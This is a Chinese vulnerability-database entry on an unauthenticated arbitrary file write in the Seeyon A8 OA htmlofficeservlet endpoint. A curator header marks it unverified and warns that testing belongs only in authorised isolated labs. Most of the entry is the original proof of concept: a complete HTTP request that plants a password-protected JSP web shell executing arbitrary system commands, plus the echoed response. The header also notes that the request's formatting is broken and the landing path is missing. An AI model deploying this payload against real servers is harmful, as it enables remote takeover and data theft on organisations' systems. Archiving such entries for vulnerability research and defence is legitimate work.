---
source: "白阁文库 BaizeSec/bylibrary"
title: "致远A8 htmlofficeservlet任意文件写入"
product: "致远A8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "6.1sp1/7.0各SP/7.1"
prerequisites: "无凭证报文，未说明全局鉴权"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md"
id: "vw-ac018c57d89bd6a105084b7f"
entity_id: "ve-ac018c57d89bd6a105084b7f"
schema_version: "1"
---

# 致远A8 htmlofficeservlet任意文件写入

## 条目说明

- 对象与具体问题：致远A8；htmlofficeservlet任意文件写入
- 版本、配置及部署条件：6.1sp1/7.0各SP/7.1
- 认证与权限前提：无凭证报文，未说明全局鉴权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同系列报告，新增DBSTEP响应文本可保留但响应反射不等于文件执行
- HTTP/DBSTEP每行多空行和缩进破坏协议
- 缺落地路径及后置结果，合并完整主文

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

---
title: '致远OA系统多版本Getshell漏洞复现'
date: Sat, 29 Aug 2020 14:55:12 +0000
draft: false
tags: ['白阁-漏洞库']
---

##### 影响版本

致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件V7.1

利用前提 访问/seeyon/htmlofficeservlet出现 `DBSTEP V3.0 0 21 0 htmoffice operate err`

POC

##### 请求包

```http
POST /seeyon/htmlofficeservlet HTTP/1.1

  Content-Length: 1121

  User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)

  Host: xxxxxxxxx

  Pragma: no-cache

  DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV

  OPTION=S3WYOSWLBSGr

  currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66

  CREATEDATE=wUghPB3szB3Xwg66

  RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6

  originalFileId=wV66

  originalCreateDate=wUghPB3szB3Xwg66

  FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6

  needReadFile=yRWZdAS6

  originalCreateDate=wLSGP4oEzLKAz4=iz=66

  <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce 
```

##### 响应包

```
DBSTEP V3.0 386 0 666 DBSTEP=OKMLlKlV

  OPTION=S3WYOSWLBSGr

  currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66

  CREATEDATE=wUghPB3szB3Xwg66

  RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6

  originalFileId=wV66

  originalCreateDate=wUghPB3szB3Xwg66

  FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6

  needReadFile=yRWZdAS6

  originalCreateDate=wLSGP4oEzLKAz4=iz=66

  CLIENTIP=wLCXqUKAP7uhw4g5zi=6

<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>
```


---

> 来源：白阁文库 BaizeSec/bylibrary
